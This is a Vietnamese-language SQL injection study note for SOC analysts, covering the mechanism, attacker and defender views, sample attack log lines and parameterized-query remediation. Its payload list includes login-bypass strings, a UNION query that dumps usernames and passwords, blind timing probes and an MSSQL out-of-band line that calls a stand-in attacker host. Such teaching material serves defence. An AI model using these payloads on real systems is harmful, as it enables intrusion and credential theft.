# SQL Injection (SQLi)

## 1. Concept

**SQL Injection (SQLi)** là lỗ hổng bảo mật xảy ra khi một ứng dụng web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện tới cơ sở dữ liệu (Database).

* **ELI5:** Hãy tưởng tượng bạn điền một tờ đơn rút tiền tại ngân hàng. Thay vì ghi tên mình vào ô "Họ tên", bạn ghi: "Tôi là chủ tài khoản này VÀ hãy đưa tôi toàn bộ tiền trong kho". Nếu nhân viên ngân hàng (ứng dụng web) không kiểm tra lại mà cứ thế làm theo tờ đơn, bạn đã thực hiện thành công một vụ "rút tiền" bằng cách thay đổi ý nghĩa của tờ đơn gốc.
* **Hậu quả:** Rò rỉ dữ liệu nhạy cảm (thông tin khách hàng, mật khẩu), vượt qua cơ chế đăng nhập, chỉnh sửa/xóa dữ liệu, hoặc thậm chí chiếm quyền điều khiển máy chủ database.

## 2. Key Mechanism

Lỗ hổng phát sinh do việc **Ghép chuỗi (Concatenation)** dữ liệu người dùng trực tiếp vào câu lệnh SQL mà không được làm sạch.

1. **Input:** Người dùng nhập dữ liệu qua URL (`GET`) hoặc Form (`POST`).
2. **Processing:** Web server lấy dữ liệu này và nối vào câu lệnh SQL mẫu: `SELECT * FROM users WHERE id = '` + **`$user_input`** + `'`.
3. **Vulnerability:** Hacker nhập các ký tự điều khiển như `'`, `--`, `;`, `UNION`.
4. **Execution:** Database thực thi câu lệnh đã bị biến đổi logic và trả về kết quả ngoài ý muốn.

**Các kỹ thuật phổ biến:**

* **Authentication Bypass:** Dùng `' OR 1=1 --` để ép biểu thức luôn đúng, cho phép đăng nhập mà không cần mật khẩu.
* **Union-Based:** Dùng toán tử `UNION` để gộp kết quả từ bảng nhạy cảm khác vào kết quả hiển thị trên web.
* **Blind SQLi:** Khi web không hiện lỗi/dữ liệu, hacker đoán từng ký tự bằng cách hỏi Đúng/Sai (**Boolean-based**) hoặc đo thời gian phản hồi (**Time-based**).
* **Out-of-Band (OOB):** Ép database tự động thực hiện một kết nối DNS/HTTP ra ngoài tới server của hacker để gửi dữ liệu về.

## 3. Security Perspective

### 🔴 Attacker View (Red Team)

Hacker thực hiện quy trình "Hút dữ liệu" bài bản:

* **Thăm dò:** Chèn dấu nháy đơn ' để tìm lỗi cú pháp (**Error-based**).
* **Khai thác cấu trúc:** Dùng ORDER BY để đếm số cột, sau đó dùng UNION SELECT để tìm cột hiển thị dữ liệu.
* **Trích xuất dữ liệu:** Truy cập information\_schema để lấy tên bảng và cột, sau đó dùng group\_concat() để lấy toàn bộ dữ liệu chỉ trong 1 request.
* **Khai thác Blind:** Dùng các hàm SLEEP() hoặc benchmark() để xác nhận lỗ hổng khi không có dữ liệu trả về trực tiếp.

### 🔵 Defender View (Blue Team/SOC)

SQLi để lại những "chữ ký" (Signatures) cực kỳ đặc trưng mà một SOC Analyst phải thuộc lòng:

* **Dấu hiệu nhận biết (SOC Alert):**
  * **SQL Keywords in Request:** Sự xuất hiện của SELECT, UNION, DROP, information\_schema trong URL hoặc Body.
  * **Database Error Spikes:** Theo dõi **Database Error Logs** (ví dụ lỗi 1064 trên MySQL). Hàng loạt lỗi cú pháp SQL liên tiếp từ 1 IP là dấu hiệu rõ ràng của việc hacker đang dò lỗi (fuzzing).
  * **Response Size Variation:** Trong Boolean-based SQLi, kích thước trang trả về sẽ thay đổi liên tục giữa 2 giá trị cố định ứng với kết quả Đúng và Sai.
  * **Slow Queries:** Trong Time-based SQLi, **Slow Query Log** của database sẽ ghi nhận các yêu cầu mất đúng 5s, 10s để xử lý (do lệnh SLEEP).
  * **Outbound DNS from DB Zone:** Máy chủ Database (vốn phải bị cô lập) bỗng dưng gửi yêu cầu DNS ra ngoài Internet (Dấu hiệu của OOB SQLi).
* **Giả lập dòng Log điển hình (WAF/Web Log):**

```
# SOC thấy IP lạ đang dùng Union-based để dò tìm tên bảng
192.168.1.10 - - [24/May/2024:10:00:01] "GET /products.php?id=0%20UNION%20SELECT%201,2,table_name,4%20FROM%20information_schema.tables HTTP/1.1" 200 1500

# Dấu hiệu Blind SQLi dùng hàm SLEEP để đo thời gian
192.168.1.10 - - [24/May/2024:10:05:15] "GET /search.php?q=apple'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)-- HTTP/1.1" 200 450
```

## 4. Useful Commands

### 🛠️ Payloads Khai thác Kinh điển

```sql
-- 1. Authentication Bypass (Dùng cho Form Đăng nhập)
' OR 1=1 --
admin' --
' OR '1'='1

-- 2. Union-Based (Dò tìm số cột và lấy dữ liệu)
' ORDER BY 3 --  -- Thử số để đếm cột
' UNION SELECT 1,2,database(),4 --  -- Lấy tên database
' UNION SELECT 1,2,group_concat(username,':',password),4 FROM users -- -- Hút sạch user/pass

-- 3. Blind - Boolean Based (Hỏi đúng/sai)
' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='admin') > 100 --

-- 4. Blind - Time Based (Hỏi qua thời gian phản hồi)
' AND IF(1=1, SLEEP(5), 0) -- (MySQL)
'; IF (1=1) WAITFOR DELAY '0:0:5' -- (MSSQL)

-- 5. Out-of-Band (Ép DB gọi DNS ra ngoài)
'; exec master..xp_dirtree '\\hacker-dns.com\a' -- (MSSQL)
```

### 🔒 Remediation (Giải pháp phòng thủ - Mentor's Choice)

Để diệt trừ SQLi tận gốc, SOC Analyst cần đề xuất:

1. **Prepared Statements (Parameterized Queries):** Đây là cách tốt nhất. Tách biệt hoàn toàn phần "Lệnh" và phần "Dữ liệu".

```php
// Cách an toàn tuyệt đối
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');
$stmt->execute([$email]); // Database chỉ coi $email là văn bản thường
```

1. **Input Validation:** Chỉ cho phép đúng định dạng (vd: ID phải là số nguyên).
2. **Principle of Least Privilege:** Tài khoản Database dùng cho ứng dụng Web không được có quyền DROP TABLE hay truy cập vào các bảng hệ thống nếu không cần thiết.

